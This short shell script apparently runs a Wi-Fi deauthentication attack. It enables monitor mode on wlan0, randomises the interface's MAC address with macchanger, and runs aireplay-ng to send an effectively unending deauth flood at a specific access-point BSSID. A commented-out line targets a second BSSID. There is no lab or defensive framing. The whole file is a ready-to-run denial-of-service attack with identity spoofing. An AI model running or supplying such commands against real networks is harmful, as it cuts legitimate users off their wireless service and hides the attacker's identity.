sudo airmon-ng start wlan0
sudo ifconfig wlan0mon down  
sudo macchanger -r wlan0mon
sudo ifconfig wlan0mon up
#sudo aireplay-ng --deauth 1 -a D4:B9:2F:82:4C:87 wlan0mon
sudo aireplay-ng --deauth 999999999999999999999999999999 -a 6A:19:F8:0F:29:3A wlan0mon

